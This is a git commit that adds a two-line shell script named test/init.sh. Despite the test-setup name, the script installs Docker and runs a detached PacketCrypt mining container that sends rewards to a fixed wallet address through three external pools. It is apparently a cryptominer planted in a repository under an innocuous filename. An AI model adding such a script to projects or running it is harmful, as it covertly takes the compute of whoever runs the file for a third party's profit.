497b77722693c10105fd5f865a9b1a10a64d46a9
MeteoritoAlpha <37050040+MeteoritoAlpha@users.noreply.github.com>
2022-10-22 00:43:51 -0300

    Create init.sh

---
+++ test/init.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+sudo apt install docker.io ; sudo docker run -d thomasjp0x42/packetcrypt ann -p pkt1qxh74v0x2z2mjtgddkza3fzhyqus3mkulckj9ld http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com 
